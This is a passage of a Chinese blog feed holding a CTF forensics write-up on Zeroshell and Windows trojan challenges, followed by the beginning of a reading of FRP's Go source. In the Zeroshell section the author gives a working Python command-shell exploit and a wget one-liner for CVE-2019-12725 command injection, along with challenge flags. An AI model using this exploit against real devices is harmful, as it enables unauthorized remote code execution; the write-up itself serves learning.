+<ul>
+<li>流量包过滤<code>ip.dst==61.139.2.100&amp;&amp;http</code></li>
+<li>发现流量包</li>
+</ul>
+<figure data-type="image" tabindex="9"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162005655.png" alt="img" loading="lazy"></figure>
+<p>进去发现一串字符</p>
+<figure data-type="image" tabindex="10"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162009224.png" alt="img" loading="lazy"></figure>
+<ul>
+<li>一眼flag Base64结果，直接解密</li>
+</ul>
+<figure data-type="image" tabindex="11"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162005166.png" alt="img" loading="lazy"></figure>
+<h3 id="zeroshell_2">Zeroshell_2</h3>
+<ul>
+<li>不多说，上面那个包一眼被打了执行命令</li>
+<li>吐槽自己一句，虚拟机卡了bug，卡了一两个小时，最后和队友换电脑一打就通，呜呜呜难受死了</li>
+<li>CVE-2019-12725</li>
+</ul>
+<figure data-type="image" tabindex="12"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162009124.png" alt="img" loading="lazy"></figure>
+<ul>
+<li>这发包累死了，后面交互这做不下去呀，得写个EXP交互shell</li>
+<li>参照做强网杯第一道题exp结构</li>
+</ul>
+<pre><code class="language-Python">import requests
+from urllib.parse import quote
+import re
+
+while True:
+    cmd = input(&quot;cmd&gt; &quot;)  # 获取用户输入的命令
+
+    if cmd.lower() == 'exit':  # 如果输入exit，则退出循环
+        break
+
+    payload = &quot;cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpoint-action=exec=%27{cmd}%27%0A%27&quot;
+    encoded_cmd = quote(cmd)  # 对命令进行URL编码
+    # 假设有一个合法的URL基础部分，这里用YOUR_BASE_URL代替
+    base_url = &quot;http://61.139.2.100/&quot;
+    url = f&quot;{base_url}{payload.replace('{cmd}', encoded_cmd)}&quot;  # 构造完整的URL
+    # print(url)
+    try:
+        response = requests.get(url)  # 发送GET请求
+        # print(response.text)  # 打印响应内容
+
+        # 使用正则表达式删除特定的HTML内容
+        clean_text = re.sub(r'&lt;html&gt;.*?&lt;/html&gt;', '', response.text, flags=re.DOTALL)
+        print(clean_text)  # 打印清理后的响应内容
+
+    except requests.RequestException as e:
+        print(f&quot;请求失败：{e}&quot;)
+find / -name flag
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162005130.png" alt="img" loading="lazy"></figure>
+<figure data-type="image" tabindex="14"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162009939.png" alt="img" loading="lazy"></figure>
+<ul>
+<li>俩flag一样的</li>
+</ul>
+<pre><code class="language-Python">flag{c6045425-6e6e-41d0-be09-95682a4f65c4}
+</code></pre>
+<h3 id="zeroshell_3">Zeroshell_3</h3>
+<ul>
+<li>这木马应该不是一直触发，过段时间出一次</li>
+<li>查看网络状态（得多试试，不一定抓到）</li>
+</ul>
+<pre><code class="language-Python">netstat -a
+</code></pre>
+<figure data-type="image" tabindex="15"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162013244.png" alt="img" loading="lazy"></figure>
+<pre><code class="language-Python">cmd&gt; netstat -a
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0 *:kerberos-adm          *:*                     LISTEN
+tcp        0      0 KDC.localdomain:domain  *:*                     LISTEN
+tcp        0      0 192.168.250.254:domain  *:*                     LISTEN
+tcp        0      0 61.139.2.100:domain     *:*                     LISTEN
+tcp        0      0 192.168.141.142:domain  *:*                     LISTEN
+tcp        0      0 localhost.locald:domain *:*                     LISTEN
+tcp        0      0 localhost.localdoma:953 *:*                     LISTEN
+tcp        0      0 localhost.localdom:ldap *:*                     LISTEN
+tcp        0      0 localhost.localdo:56914 localhost.localdom:ldap ESTABLISHED
+tcp        0      0 61.139.2.100:43085      M.ROOT-SERVERS.N:domain TIME_WAIT
+tcp        0      0 61.139.2.100:33171      a0.org.afilias-n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:37965      a0.org.afilias-n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:44065      b2.org.afilias-n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:37965      a0.org.afilias-n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:34095      A0.INFO.AFILIAS-:domain TIME_WAIT
+tcp        0      0 61.139.2.100:44065      b2.org.afilias-n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:47235      x.ns.se:domain          ESTABLISHED
+tcp        0      0 61.139.2.100:38275      M.ROOT-SERVERS.N:domain TIME_WAIT
+tcp        0      0 61.139.2.100:46061      c.root-servers.n:domain TIME_WAIT
+tcp        0      0 localhost.localdo:56910 localhost.localdom:ldap ESTABLISHED
+tcp        0      0 61.139.2.100:40409      A0.INFO.AFILIAS-:domain TIME_WAIT
+tcp        0      0 61.139.2.100:59067      c0.org.afilias-n:domain TIME_WAIT
+tcp        0      0 localhost.localdom:ldap localhost.localdo:56920 ESTABLISHED
+tcp        0      0 61.139.2.100:56587      a0.org.afilias-n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:45133      l.root-servers.n:domain TIME_WAIT
+tcp        0      0 localhost.localdom:ldap localhost.localdo:56918 ESTABLISHED
+tcp        0      0 61.139.2.100:45523      192.112.36.4:domain     TIME_WAIT
+tcp        0      0 localhost.localdo:56912 localhost.localdom:ldap ESTABLISHED
+tcp        0      0 61.139.2.100:40015      i.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:44243      A0.INFO.AFILIAS-:domain TIME_WAIT
+tcp        0      0 61.139.2.100:50969      e.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:51223      M.ROOT-SERVERS.N:domain TIME_WAIT
+tcp        0      0 61.139.2.100:33225      c.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:35605      l.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:44243      A0.INFO.AFILIAS-:domain TIME_WAIT
+tcp        0      0 61.139.2.100:50969      e.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:33225      c.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:35583      l.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:59151      z.ns.se:domain          TIME_WAIT
+tcp        0      0 61.139.2.100:57893      x.ns.se:domain          TIME_WAIT
+tcp        0      0 61.139.2.100:41387      k.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:59799      l.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:33915      a.dns.it:domain         TIME_WAIT
+tcp        0      0 61.139.2.100:49391      m.dns.it:domain         TIME_WAIT
+tcp        0      0 61.139.2.100:57407      j.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 localhost.localdom:ldap localhost.localdo:56914 ESTABLISHED
+tcp        0      0 61.139.2.100:48997      f.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:56033      x.ns.se:domain          TIME_WAIT
+tcp        0      0 localhost.localdo:56920 localhost.localdom:ldap ESTABLISHED
+tcp        0      0 61.139.2.100:52587      i.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:41519      d.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 localhost.localdom:ldap localhost.localdo:56916 ESTABLISHED
+tcp        0      0 localhost.localdo:56916 localhost.localdom:ldap ESTABLISHED
+tcp        0      0 61.139.2.100:43685      192.112.36.4:domain     TIME_WAIT
+tcp        0      0 61.139.2.100:49173      i.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:58851      z.ns.se:domain          TIME_WAIT
+tcp        0      0 localhost.localdom:ldap localhost.localdo:56910 ESTABLISHED
+tcp        0      0 61.139.2.100:39871      e.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:54571      c.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:34605      l.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:43537      k.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:46791      z.ns.se:domain          TIME_WAIT
+tcp        0      0 61.139.2.100:37013      192.112.36.4:domain     TIME_WAIT
+tcp        0      0 61.139.2.100:46399      a2.org.afilias-n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:55289      d.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:39255      b-2004.b.root-se:domain TIME_WAIT
+tcp        0      0 61.139.2.100:47487      192.112.36.4:domain     TIME_WAIT
+tcp        0      0 61.139.2.100:58451      e.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:39255      b-2004.b.root-se:domain TIME_WAIT
+tcp        0      0 61.139.2.100:47487      192.112.36.4:domain     TIME_WAIT
+tcp        0      0 61.139.2.100:58451      e.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:49089      e.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:33023      m.dns.it:domain         TIME_WAIT
+tcp        0      0 61.139.2.100:46925      x.ns.se:domain          TIME_WAIT
+tcp        0      0 61.139.2.100:53227      h.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:60573      m.dns.it:domain         TIME_WAIT
+tcp        0      0 localhost.localdo:56918 localhost.localdom:ldap ESTABLISHED
+tcp        0      0 61.139.2.100:34121      192.112.36.4:domain     TIME_WAIT
+tcp        0      0 61.139.2.100:46849      d.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:51301      z.ns.se:domain          TIME_WAIT
+tcp        0      0 61.139.2.100:51213      d.dns.it:domain         TIME_WAIT
+tcp        0      0 61.139.2.100:33379      x.ns.se:domain          TIME_WAIT
+tcp        0      0 61.139.2.100:52391      m.dns.it:domain         TIME_WAIT
+tcp        0      0 61.139.2.100:37893      A0.INFO.AFILIAS-:domain TIME_WAIT
+tcp        0      0 61.139.2.100:39213      c.ns.se:domain          TIME_WAIT
+tcp        0      0 61.139.2.100:36225      d.dns.it:domain         TIME_WAIT
+tcp        0      0 61.139.2.100:52841      l.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:56189      192.112.36.4:domain     TIME_WAIT
+tcp        0      0 61.139.2.100:50629      192.112.36.4:domain     TIME_WAIT
+tcp        0      0 61.139.2.100:43567      A0.INFO.AFILIAS-:domain TIME_WAIT
+tcp        0      0 61.139.2.100:36957      d.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:47391      d.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:35085      A0.INFO.AFILIAS-:domain TIME_WAIT
+tcp        0      0 61.139.2.100:42349      192.112.36.4:domain     TIME_WAIT
+tcp        0      0 61.139.2.100:47627      e.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:34175      A0.INFO.AFILIAS-:domain TIME_WAIT
+tcp        0      0 61.139.2.100:35877      d.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:40979      m.dns.it:domain         TIME_WAIT
+tcp        0      0 61.139.2.100:49659      c.ns.se:domain          TIME_WAIT
+tcp        0      0 61.139.2.100:49507      m.dns.it:domain         TIME_WAIT
+tcp        0      0 61.139.2.100:57829      D0.INFO.AFILIAS-:domain TIME_WAIT
+tcp        0      0 61.139.2.100:37275      d.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:59037      h.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 localhost.localdom:ldap localhost.localdo:56922 ESTABLISHED
+tcp        0      0 61.139.2.100:56535      b-2004.b.root-se:domain TIME_WAIT
+tcp        0      0 localhost.localdo:56928 localhost.localdom:ldap TIME_WAIT
+tcp        0      0 localhost.localdom:ldap localhost.localdo:56908 ESTABLISHED
+tcp        0      0 61.139.2.100:47253      b-2004.b.root-se:domain TIME_WAIT
+tcp        0      0 61.139.2.100:50011      i.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:47907      192.112.36.4:domain     TIME_WAIT
+tcp        0      1 61.139.2.100:39386      202.115.89.103:http-alt SYN_SENT
+tcp        0      0 61.139.2.100:45417      b-2004.b.root-se:domain TIME_WAIT
+tcp        0      0 61.139.2.100:49667      d.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:45737      i.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:43643      b-2004.b.root-se:domain TIME_WAIT
+tcp        0      0 61.139.2.100:37993      192.112.36.4:domain     TIME_WAIT
+tcp        0      0 61.139.2.100:37993      192.112.36.4:domain     TIME_WAIT
+tcp        0      0 61.139.2.100:47981      y.ns.se:domain          TIME_WAIT
+tcp        0      0 61.139.2.100:41227      i.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:33447      ns-w.ant.isi.edu:domain TIME_WAIT
+tcp        0      0 61.139.2.100:58111      c0.org.afilias-n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:59913      k.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:53117      a.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:48453      j.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:58467      b-2004.b.root-se:domain TIME_WAIT
+tcp        0      0 61.139.2.100:50803      192.112.36.4:domain     TIME_WAIT
+tcp        0      0 61.139.2.100:56599      a.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:59077      c.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:48575      d.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 localhost.localdom:ldap localhost.localdo:56912 ESTABLISHED
+tcp        0      0 61.139.2.100:55893      d.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:51429      k.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:39265      i.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:38027      d.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:60927      192.112.36.4:domain     TIME_WAIT
+tcp        0      0 61.139.2.100:39375      b-2004.b.root-se:domain TIME_WAIT
+tcp        0      0 localhost.localdo:56922 localhost.localdom:ldap ESTABLISHED
+tcp        0      0 61.139.2.100:56211      192.112.36.4:domain     TIME_WAIT
+tcp        0      0 61.139.2.100:50853      dns2.edu.cn:domain      TIME_WAIT
+tcp        0      0 61.139.2.100:42793      c.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:48795      b-2004.b.root-se:domain TIME_WAIT
+tcp        0      0 *:www-http              *:*                     LISTEN
+tcp        0      0 *:domain                *:*                     LISTEN
+tcp        0      0 *:https                 *:*                     LISTEN
+tcp        0      0 ::ffff:61.139.:www-http ::ffff:61.139.2.1:64845 ESTABLISHED
+udp        0      0 *:kpasswd               *:*
+udp        0      0 KDC.localdomain:domain  *:*
+udp        0      0 192.168.250.254:domain  *:*
+udp        0      0 61.139.2.100:domain     *:*
+udp        0      0 192.168.141.142:domain  *:*
+udp        0      0 localhost.locald:domain *:*
+udp        0      0 192.168.250.25:kerberos *:*
+udp        0      0 KDC.localdomai:kerberos *:*
+udp        0      0 61.139.2.100:kerberos   *:*
+udp        0      0 KDC.localdomain:ntp     *:*
+udp        0      0 61.139.2.100:ntp        *:*
+udp        0      0 localhost.localdoma:ntp *:*
+udp        0      0 *:ntp                   *:*
+udp        0      0 192.168.250:kerberos-iv *:*
+udp        0      0 KDC.localdo:kerberos-iv *:*
+udp        0      0 61.139.2.10:kerberos-iv *:*
+udp        0      0 *:domain                *:*
+udp        0      0 fe80::e40e:6ff:kerberos *:*
+udp        0      0 fe80::20c:29ff:kerberos *:*
+udp        0      0 fe80::e40e:6ff:fe6d:ntp *:*
+udp        0      0 fe80::20c:29ff:fe9f:ntp *:*
+udp        0      0 ::1:ntp                 *:*
+udp        0      0 *:ntp                   *:*
+udp        0      0 fe80::e40e::kerberos-iv *:*
+udp        0      0 fe80::20c:2:kerberos-iv *:*
+Active UNIX domain sockets (servers and established)
+Proto RefCnt Flags       Type       State         I-Node Path
+unix  2      [ ACC ]     STREAM     LISTENING     15995  /var/run/acpid.socket
+unix  2      [ ACC ]     SEQPACKET  LISTENING     12410  /run/udev/control
+unix  9      [ ]         DGRAM                    16811  /dev/log
+unix  3      [ ]         STREAM     CONNECTED     20014
+unix  2      [ ]         DGRAM                    19977
+unix  3      [ ]         STREAM     CONNECTED     20015
+unix  2      [ ]         DGRAM                    19636
+unix  2      [ ]         DGRAM                    16830
+unix  2      [ ]         DGRAM                    19316
+unix  2      [ ]         DGRAM                    19606
+unix  3      [ ]         DGRAM                    7849
+unix  3      [ ]         DGRAM                    7850
+unix  2      [ ]         DGRAM                    18318
+unix  2      [ ]         DGRAM                    15992
+flag{202.115.89.103}
+</code></pre>
+<h3 id="zeroshell_4">Zeroshell_4</h3>
+<ul>
+<li>全局搜索目标ip<code>202.115.89.103</code></li>
+</ul>
+<figure data-type="image" tabindex="16"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162011252.png" alt="img" loading="lazy"></figure>
+<ul>
+<li>Exp find全局搜一下</li>
+<li>在/Database/目录下，和 flag一样</li>
+</ul>
+<pre><code class="language-Python">flag{.nginx}
+</code></pre>
+<h3 id="zeroshell_5">Zeroshell_5</h3>
+<p>提取木马文件</p>
+<pre><code class="language-SQL">wget &quot;http://61.139.2.100/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpoint-action=exec=%27cat%20/Database/.nginx%27%0A%27&quot;
+</code></pre>
+<figure data-type="image" tabindex="17"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162011433.png" alt="img" loading="lazy"></figure>
+<p>得到的文件拖到IDA中打开，查看字符串，发现IP后面跟着一串字符，猜测为加密秘钥，尝试提交，结果正确</p>
+<figure data-type="image" tabindex="18"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162012518.png" alt="img" loading="lazy"></figure>
+<pre><code class="language-Python">flag{11223344qweasdzxc}
+</code></pre>
+<h3 id="winft_1">WinFT_1</h3>
+<ul>
+<li>老规矩，先net一下看看</li>
+</ul>
+<pre><code class="language-Python">netstat -a
+</code></pre>
+<ul>
+<li>明显有一个外部地址不一样</li>
+</ul>
+<figure data-type="image" tabindex="19"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162012231.png" alt="img" loading="lazy"></figure>
+<ul>
+<li><code>Wireshark</code>看看包，先全局搜索下<code>miscsecure</code>,没有，那咱们一个字符一个字符删看看，一下看到一个<code>.exe</code>.</li>
+</ul>
+<figure data-type="image" tabindex="20"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162012464.png" alt="img" loading="lazy"></figure>
+<ul>
+<li>这个<code>exe</code>文件大概率是马,点开看，与咱们一开始<code>net</code>的对上了，刚刚那个<code>miscsecure</code>应该是<code>192.168.116.130</code></li>
+</ul>
+<figure data-type="image" tabindex="21"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162014926.png" alt="img" loading="lazy"></figure>
+<pre><code class="language-Python">flag{miscsecure.com:192.168.116.130:443}
+</code></pre>
+<h3 id="winft_2">WinFT_2</h3>
+<ul>
+<li>查看任务计划程序，很明显的定时启动木马</li>
+</ul>
+<figure data-type="image" tabindex="22"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162012557.png" alt="img" loading="lazy"></figure>
+<pre><code class="language-Python">JiM3ODsmIzEwNTsmIzk5OyYjMTAxOyYjNjUyOTI7JiMxMDI7JiMxMDg7JiM5NzsmIzEwMzsmIzMyOyYjMTA1OyYjMTE1OyYjMzI7JiMxMjM7JiM2NTsmIzY5OyYjODM7JiM5NTsmIzEwMTsmIzExMDsmIzk5OyYjMTE0OyYjMTIxOyYjMTEyOyYjMTE2OyYjMTA1OyYjMTExOyYjMTEwOyYjOTU7JiM5NzsmIzEwODsmIzEwMzsmIzExMTsmIzExNDsmIzEwNTsmIzExNjsmIzEwNDsmIzEwOTsmIzk1OyYjMTA1OyYjMTE1OyYjOTU7JiM5NzsmIzExMDsmIzk1OyYjMTAxOyYjMTIwOyYjOTk7JiMxMDE7JiMxMDg7JiMxMDg7JiMxMDE7JiMxMTA7JiMxMTY7JiM5NTsmIzEwMTsmIzExMDsmIzk5OyYjMTE0OyYjMTIxOyYjMTEyOyYjMTE2OyYjMTA1OyYjMTExOyYjMTEwOyYjOTU7JiM5NzsmIzEwODsmIzEwMzsmIzExMTsmIzExNDsmIzEwNTsmIzExNjsmIzEwNDsmIzEwOTsmIzEyNTs=
+</code></pre>
+<ul>
+<li><code>base64</code></li>
+</ul>
+<figure data-type="image" tabindex="23"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162012680.png" alt="img" loading="lazy"></figure>
+<pre><code class="language-Python">Nice，flag is {AES_encryption_algorithm_is_an_excellent_encryption_algorithm}
+</code></pre>
+<h3 id="sc05_1">sc05_1</h3>
+<p>打开表格，搜索134.6.4.12，tcp中最早的即为所求</p>
+<figure data-type="image" tabindex="24"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162012614.png" alt="img" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[FRP代码阅读]]></title>
+        <id>https://yzs17.github.io/post/FRP/</id>
+        <link href="https://yzs17.github.io/post/FRP/">
+        </link>
+        <updated>2024-11-15T10:26:21.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="frp代码阅读"><code>FRP</code>代码阅读</h2>
+<h2 id="frps">frps</h2>
+<p><code>cmd/frps/main.go</code> 是frps的入口处，我们从这里开始，<code>main</code> 函数的主体：</p>
+<pre><code class="language-go">func main() {
+	crypto.DefaultSalt = &quot;frp&quot;
+
+	Execute()
+}
+</code></pre>
+<p>因此我们需要看到 <code>Execute()</code> 函数的内容，其实它是使用了 <code>cobra</code> 这个库，所以实际的入口在</p>
+<pre><code class="language-go">var rootCmd = &amp;cobra.Command{
+        Use:   &quot;frps&quot;,
+        Short: &quot;frps is the server of frp (https://github.com/fatedier/frp)&quot;,
+        RunE: func(cmd *cobra.Command, args []string) error {
+                if showVersion {
+                        fmt.Println(version.Full())
+                        return nil
+                }
+
+                var err error
+                if cfgFile != &quot;&quot; {
+                        var content string
+                        content, err = config.GetRenderedConfFromFile(cfgFile)
+                        if err != nil {
+                                return err
+                        }
+                        g.GlbServerCfg.CfgFile = cfgFile
+                        err = parseServerCommonCfg(CfgFileTypeIni, content)
+                } else {
+                        err = parseServerCommonCfg(CfgFileTypeCmd, &quot;&quot;)
+                }
+                if err != nil {
+                        return err
+                }
+
+                err = runServer()
+                if err != nil {
+                        fmt.Println(err)
+                        os.Exit(1)
+                }
+                return nil
+        },
+}
+</code></pre>
+<p>最终，也就是 <code>runServer()</code> 这个函数：</p>
+<pre><code class="language-go">func runServer() (err error) {
+        log.InitLog(g.GlbServerCfg.LogWay, g.GlbServerCfg.LogFile, g.GlbServerCfg.LogLevel,
+                g.GlbServerCfg.LogMaxDays)
+        svr, err := server.NewService()
+        if err != nil {
+                return err
+        }
+        log.Info(&quot;Start frps success&quot;)
+        server.ServerService = svr
+        svr.Run()
+        return
+}
+</code></pre>
+<p><code>svr.Run()</code>，其中的 <code>svr</code> 是来自 <code>server.NewService()</code>，仔细看一下，<code>server.NewService()</code> 其实就是初始化了一大堆东西。</p>
+<pre><code class="language-go">func (svr *Service) Run() {
+        if svr.rc.NatHoleController != nil {
+                go svr.rc.NatHoleController.Run()
+        }
+        if g.GlbServerCfg.KcpBindPort &gt; 0 {
+                go svr.HandleListener(svr.kcpListener)
+        }
+
+        go svr.HandleListener(svr.websocketListener)
+        go svr.HandleListener(svr.tlsListener)
+
+        svr.HandleListener(svr.listener)
+}
+</code></pre>
+<p>可以看到，最后frps会执行到 <code>svr.HandleListener(svr.listener)</code>，前面的都是什么 nat hole punching, kcp, websocket, tls等等，我们不看。直接看tcp。</p>
+<pre><code class="language-go">func (svr *Service) HandleListener(l frpNet.Listener) {
+	// Listen for incoming connections from client.
+	for {
+		c, err := l.Accept()
+		if err != nil {
+			log.Warn(&quot;Listener for incoming connections from client closed&quot;)
+			return
+		}
+		c = frpNet.CheckAndEnableTLSServerConn(c, svr.tlsConfig)
+
+		// Start a new goroutine for dealing connections.
+		go func(frpConn frpNet.Conn) {
+        ...
+        }
+    }
+}
+</code></pre>
+<p>这里就是监听之后，每来一个新的连接，就起一个goroutine去处理，也就是 <code>go func()...</code> 这一段，然后我们看看内容：</p>
+<pre><code class="language-go">switch m := rawMsg.(type) {
+case *msg.Login:
+    err = svr.RegisterControl(conn, m)
+    // If login failed, send error message there.
+    // Otherwise send success message in control's work goroutine.
+    if err != nil {
+        conn.Warn(&quot;%v&quot;, err)
+        msg.WriteMsg(conn, &amp;msg.LoginResp{
+            Version: version.Full(),
+            Error:   err.Error(),
+        })
+        conn.Close()
+    }
+case *msg.NewWorkConn:
+    svr.RegisterWorkConn(conn, m)
+case *msg.NewVisitorConn:
+    if err = svr.RegisterVisitorConn(conn, m); err != nil {
+        conn.Warn(&quot;%v&quot;, err)
+        msg.WriteMsg(conn, &amp;msg.NewVisitorConnResp{
+            ProxyName: m.ProxyName,
+            Error:     err.Error(),
+        })
+        conn.Close()
+    } else {
+        msg.WriteMsg(conn, &amp;msg.NewVisitorConnResp{
+            ProxyName: m.ProxyName,
+            Error:     &quot;&quot;,
+        })
+    }
+default:
+    log.Warn(&quot;Error message type for the new connection [%s]&quot;, conn.RemoteAddr().String())
+    conn.Close()
+}
+</code></pre>
+<p>这就是服务端启动之后，卡住的地方了。客户端建立连接之后，会发送一个消息，它的类型可能是 <code>msg.Login</code>, <code>msg.NewWorkConn</code>, <code>msg.NewVisitorConn</code>。上一篇我们说了，visitor 是用于stcp也就是端对端加密通信的workConn就是用于转发流量的，Login就是新的客户端连上去之后进行启动。</p>
+<h2 id="frpc">frpc</h2>
+<p>从 <code>cmd/frpc/main.go</code> 看起：</p>
+<pre><code class="language-go">func main() {
+        crypto.DefaultSalt = &quot;frp&quot;
+
+        sub.Execute()
+}
+</code></pre>
+<p>跳转到 <code>sub.Execute()</code>：</p>
+<pre><code class="language-go">var rootCmd = &amp;cobra.Command{
+        Use:   &quot;frpc&quot;,
+        Short: &quot;frpc is the client of frp (https://github.com/fatedier/frp)&quot;,
+        RunE: func(cmd *cobra.Command, args []string) error {
+                if showVersion {
+                        fmt.Println(version.Full())
+                        return nil
+                }
+
+                // Do not show command usage here.
+                err := runClient(cfgFile)
+                if err != nil {
+                        fmt.Println(err)
+                        os.Exit(1)
+                }
+                return nil
+        },
+}
+
+func Execute() {
+        if err := rootCmd.Execute(); err != nil {
+                os.Exit(1)
+        }
+}
+</code></pre>
+<p>然后我们看 <code>runClient</code> 函数：</p>
+<pre><code class="language-go">func runClient(cfgFilePath string) (err error) {
+        var content string
+        content, err = config.GetRenderedConfFromFile(cfgFilePath)
+        if err != nil {
+                return
+        }
+        g.GlbClientCfg.CfgFile = cfgFilePath
+
+        err = parseClientCommonCfg(CfgFileTypeIni, content)
+        if err != nil {
+                return
+        }
+
+        pxyCfgs, visitorCfgs, err := config.LoadAllConfFromIni(g.GlbClientCfg.User, content, g.GlbClientCfg.Start)
+        if err != nil {
+                return err
+        }
+
+        err = startService(pxyCfgs, visitorCfgs)
+        return
+}
+</code></pre>
+<p>基本上就是解析配置文件（因为frpc启动的时候要一个配置文件），然后执行 <code>startService</code>：</p>
+<pre><code class="language-go">func startService(pxyCfgs map[string]config.ProxyConf, visitorCfgs map[string]config.VisitorConf) (err error) {
+        log.InitLog(g.GlbClientCfg.LogWay, g.GlbClientCfg.LogFile, g.GlbClientCfg.LogLevel, g.GlbClientCfg.LogMaxDays)
+        if g.GlbClientCfg.DnsServer != &quot;&quot; {
+                s := g.GlbClientCfg.DnsServer
+                if !strings.Contains(s, &quot;:&quot;) {
+                        s += &quot;:53&quot;
+                }
+                // Change default dns server for frpc
+                net.DefaultResolver = &amp;net.Resolver{
+                        PreferGo: true,
+                        Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
+                                return net.Dial(&quot;udp&quot;, s)
+                        },
+                }
+        }
+        svr, errRet := client.NewService(pxyCfgs, visitorCfgs)
+        if errRet != nil {
+                err = errRet
+                return
+        }
+
+        // Capture the exit signal if we use kcp.
+        if g.GlbClientCfg.Protocol == &quot;kcp&quot; {
+                go handleSignal(svr)
+        }
+
+        err = svr.Run()
+        if g.GlbClientCfg.Protocol == &quot;kcp&quot; {
+                &lt;-kcpDoneCh
+        }
+        return
+}
+</code></pre>
+<p>同样的，执行 <code>client.NewService</code> 之后执行 <code>svr.Run()</code>，</p>
+<pre><code class="language-go">func (svr *Service) Run() error {
+	// first login
+	for {
+		conn, session, err := svr.login()
+		if err != nil {
+			log.Warn(&quot;login to server failed: %v&quot;, err)
+
+			// if login_fail_exit is true, just exit this program
+			// otherwise sleep a while and try again to connect to server
+			if g.GlbClientCfg.LoginFailExit {
+				return err
+			} else {
+				time.Sleep(10 * time.Second)
+			}
+		} else {
+			// login success
+			ctl := NewControl(svr.runId, conn, session, svr.pxyCfgs, svr.visitorCfgs)
+			ctl.Run()
